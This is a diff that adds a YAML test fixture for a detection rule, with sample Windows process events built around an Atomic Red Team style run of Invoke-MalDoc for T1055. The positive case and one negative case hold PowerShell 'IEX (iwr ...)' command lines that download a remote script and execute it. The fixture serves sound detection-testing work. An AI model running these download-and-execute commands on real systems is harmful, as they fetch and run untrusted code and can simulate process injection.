@@ -1,0 +1,22 @@
+id: c17705f9-58e7-4834-a3fb-8eba1da3b0b0
+positive:
+- name: Atomic Red Team style Invoke-MalDoc T1055 run at High integrity
+  event: &ev
+    event.code: "1"
+    process.name: powershell.exe
+    process.executable: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    process.command_line: powershell.exe -c "IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1055/src/x.ps1); Invoke-MalDoc -macroCode $c -officeProduct Word"
+    winlog.event_data.IntegrityLevel: High
+negative:
+- name: same command at Medium integrity
+  event:
+    <<: *ev
+    winlog.event_data.IntegrityLevel: Medium
+- name: Invoke-MalDoc without the T1055 literal
+  event:
+    <<: *ev
+    process.command_line: powershell.exe -c "IEX (iwr https://raw.githubusercontent.com/x/y/a.ps1); Invoke-MalDoc"
+- name: ordinary download from GitHub
+  event:
+    <<: *ev
+    process.command_line: powershell.exe -c "iwr https://raw.githubusercontent.com/x/y/a.ps1"
